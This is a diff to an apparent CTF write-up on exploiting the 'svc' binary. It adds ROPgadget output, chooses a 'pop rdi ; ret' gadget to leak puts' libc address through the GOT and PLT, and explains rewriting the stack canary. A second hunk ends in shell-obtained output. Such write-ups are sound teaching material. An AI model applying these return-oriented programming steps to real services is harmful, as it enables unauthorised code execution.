@@ -200,8 +200,29 @@ So we can see that the address that we need to call puts is `0x4008d0`. The next
 So the `GOT` address of puts is `0x602018`. The last piece that we need in order to call puts is a ROP gadget which will pop the argument for puts (a pointer to the libc address of `puts`), and call the plt address of `puts`:
 
 ```
-
+$ python ROPgadget.py --binary svc | grep pop
+0x00000000004009fc : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
+0x00000000004009fe : add byte ptr [rax], al ; pop rbp ; ret
+0x00000000004009ed : je 0x400a08 ; pop rbp ; mov edi, 0x602088 ; jmp rax
+0x0000000000400a3b : je 0x400a50 ; pop rbp ; mov edi, 0x602088 ; jmp rax
+0x00000000004009f8 : nop dword ptr [rax + rax] ; pop rbp ; ret
+0x0000000000400a45 : nop dword ptr [rax] ; pop rbp ; ret
+0x0000000000400e9c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400e9e : pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400ea0 : pop r14 ; pop r15 ; ret
+0x0000000000400ea2 : pop r15 ; ret
+0x0000000000400a62 : pop rbp ; mov byte ptr [rip + 0x20188e], 1 ; ret
+0x00000000004009ef : pop rbp ; mov edi, 0x602088 ; jmp rax
+0x0000000000400e9b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400e9f : pop rbp ; pop r14 ; pop r15 ; ret
+0x0000000000400a00 : pop rbp ; ret
+0x0000000000400ea3 : pop rdi ; ret
+0x0000000000400ea1 : pop rsi ; pop r15 ; ret
+0x0000000000400e9d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004009fa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
 ```
+
+Looking through the list of ROPgadgets (using ROPgadget) we can see a gadget which will work for us. The gadget at `0x400ea3` will pop our argument into the `rdi` register, then return which will allow us to call puts with an argument of our choice.
 
 So now that we have the three pieces we need, we can call puts. When we look at the stack in IDA, we can see that the stack canary is stored at `rbp-0x0`. We can also see that the return address is stored at `rbp+0x8`. So we will need to have 8 bytes of filler after our canary to reach the return address, then we can write our rop gadget address followed by the got and the plt addresses for puts. Also we will need to rewrite the stack canary, since we did overwrite the null byte in it with a newline character. Here is the code for that (it is modified from the previous script).
 
@@ -496,7 +517,7 @@ when we run it:
 $	python exploit.py
 ``` 
 
-...
+One wall of text later...
 
 ```
 [*] Enjoy your shell XD
